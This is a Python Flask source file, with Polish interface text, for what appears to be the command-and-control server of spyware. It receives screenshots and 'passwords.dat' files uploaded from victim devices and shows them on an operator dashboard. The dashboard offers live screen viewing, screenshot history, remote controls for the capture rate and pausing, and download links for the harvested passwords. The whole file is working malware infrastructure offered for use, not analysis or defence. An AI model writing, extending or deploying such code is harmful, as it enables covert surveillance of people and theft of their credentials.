from flask import Flask, request, send_file, jsonify, render_template_string, redirect, url_for
import os
import datetime
import json

app = Flask(__name__)
UPLOAD_FOLDER = "screens"
COMMAND_FOLDER = "commands"

os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(COMMAND_FOLDER, exist_ok=True)

@app.route("/")
def index():
    users = sorted(os.listdir(UPLOAD_FOLDER))
    now = datetime.datetime.utcnow()
    device_list = []

    for u in users:
        folder = os.path.join(UPLOAD_FOLDER, u)
        files = sorted(os.listdir(folder))
        has_passwords = os.path.exists(os.path.join(folder, "passwords.dat"))

        if not files:
            device_list.append((u, "🔴", "brak plików", has_passwords))
            continue
        latest = files[-1]
        timestamp_str = latest.replace("screenshot_", "").replace(".png", "")
        try:
            timestamp = datetime.datetime.strptime(timestamp_str, "%Y-%m-%d_%H-%M-%S")
            timestamp += datetime.timedelta(hours=2)
            diff = (now - timestamp).total_seconds()
            if diff < 60:
                device_list.append((u, "🟢", timestamp.strftime("%H:%M:%S"), has_passwords))
            else:
                device_list.append((u, "🔴", timestamp.strftime("%H:%M:%S"), has_passwords))
        except:
            device_list.append((u, "🔴", "błąd daty", has_passwords))

    content = f"<h1>Urządzenia: {len(device_list)}</h1><ul>"
    for u, status, t, has_passwords in device_list:
        content += f'<li>{status} <a href="/view?user={u}">{u}</a> (ostatni screen: {t}) | <a href="/history?user={u}">Historia</a>'
        if has_passwords:
            content += f' | <a href="/screens/{u}/passwords.dat" download>🔐 Hasła</a>'
        content += '</li>'
    content += "</ul>"
    return content

@app.route("/view")
def view():
    user = request.args.get("user")
    if not user:
        return redirect(url_for("index"))
    return render_template_string('''
        <html>
        <head>
            <title>Zdalny Podgląd - {{ user }}</title>
            <style>
                body { background: #111; color: white; text-align: center; font-family: sans-serif; }
                img { max-width: 90%; border: 2px solid white; margin: 10px auto; display: block; }
                .panel { margin-top: 20px; }
                button { margin: 5px; padding: 10px 20px; font-size: 16px; cursor: pointer; }
                .status-box { margin-top: 20px; padding: 10px; background: #222; border: 1px solid #555; display: inline-block; }
            </style>
            <script>
                const user = "{{ user }}";
                async function sendCommand(action) {
                    await fetch("/command?user=" + user, {
                        method: "POST",
                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                        body: "action=" + action
                    });
                    updateStatus();
                }

                async function updateStatus() {
                    const res = await fetch("/command?user=" + user);
                    const data = await res.json();
                    document.getElementById("status").innerText = `Status: ${data.paused ? 'Zatrzymany' : 'Aktywny'} | Interwał: ${data.interval}s`;
                }

                setInterval(updateStatus, 3000);
                window.onload = updateStatus;
            </script>
        </head>
        <body>
            <h1>📸 Podgląd Ekranu - {{ user }}</h1>
            <img src="/latest?user={{ user }}" />

            <div class="panel">
                <button onclick="sendCommand('one_shot')">Zrób screena teraz</button>
                <button onclick="sendCommand('pause')">Pauza</button>
                <button onclick="sendCommand('resume')">Start</button>
                <button onclick="sendCommand('faster')">Szybciej</button>
                <button onclick="sendCommand('slower')">Wolniej</button>
            </div>
            <div class="status-box" id="status">
                Status: ładowanie...
            </div>
        </body>
        </html>
    ''', user=user)

@app.route("/latest")
def latest():
    user = request.args.get("user")
    folder = os.path.join(UPLOAD_FOLDER, user)
    if not os.path.exists(folder):
        return "Brak screenów.", 404
    files = sorted(os.listdir(folder))
    if not files:
        return "Brak screenów.", 404
    return send_file(os.path.join(folder, files[-1]), mimetype='image/png')

@app.route("/upload", methods=['POST'])
def upload():
    user = request.form.get("user")
    if not user:
        return "Brak ID użytkownika", 400
    folder = os.path.join(UPLOAD_FOLDER, user)
    os.makedirs(folder, exist_ok=True)

    file = request.files['screenshot']
    now = (datetime.datetime.utcnow() + datetime.timedelta(hours=2)).strftime("%Y-%m-%d_%H-%M-%S")
    filename = f"screenshot_{now}.png"
    filepath = os.path.join(folder, filename)
    file.save(filepath)
    return "OK"

@app.route("/history")
def history():
    user = request.args.get("user")
    folder = os.path.join(UPLOAD_FOLDER, user)
    if not os.path.exists(folder):
        return "Brak screenów.", 404
    files = sorted(os.listdir(folder))
    images = "".join([f'<li><a href="/screens/{user}/{f}" target="_blank">{f}</a></li>' for f in files])
    return f"<h1>Historia Screenów - {user}</h1><ul>{images}</ul>"

@app.route("/screens/<user>/<filename>")
def get_screen(user, filename):
    return send_file(os.path.join(UPLOAD_FOLDER, user, filename), mimetype='image/png')

@app.route("/command", methods=['GET', 'POST'])
def command():
    user = request.args.get("user")
    if not user:
        return "Brak ID użytkownika", 400
    command_file = os.path.join(COMMAND_FOLDER, f"{user}.json")

    if request.method == 'POST':
        action = request.form.get("action")
        data = {}
        if os.path.exists(command_file):
            with open(command_file, "r") as f:
                data = json.load(f)

        if action == "pause":
            data["paused"] = True
        elif action == "resume":
            data["paused"] = False
        elif action == "faster":
            data["interval"] = max(1, data.get("interval", 5) - 1)
        elif action == "slower":
            data["interval"] = data.get("interval", 5) + 1
        elif action == "one_shot":
            data["one_shot"] = True

        with open(command_file, "w") as f:
            json.dump(data, f)

        return "OK"
    else:
        if not os.path.exists(command_file):
            return jsonify({"paused": False, "interval": 5})
        with open(command_file, "r") as f:
            return jsonify(json.load(f))

@app.route("/upload_passwords", methods=['POST'])
def upload_passwords():
    user = request.form.get("user")
    if not user:
        return "Brak ID użytkownika", 400

    folder = os.path.join("screens", user)
    os.makedirs(folder, exist_ok=True)

    if 'data' not in request.files:
        return "Brak pliku 'data'", 400

    file = request.files['data']
    filepath = os.path.join(folder, "passwords.dat")
    file.save(filepath)

    # marker by urządzenie było widoczne
    with open(os.path.join(folder, "received_passwords.txt"), "w") as f:
        f.write(datetime.now().isoformat())

    return "OK"

@app.route("/download_passwords/<user>")
def download_passwords(user):
    folder = os.path.join("screens", user)
    filepath = os.path.join(folder, "passwords.dat")
    if not os.path.exists(filepath):
        return "Plik nie istnieje", 404
    return send_file(filepath, as_attachment=True, download_name="passwords.dat")


if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
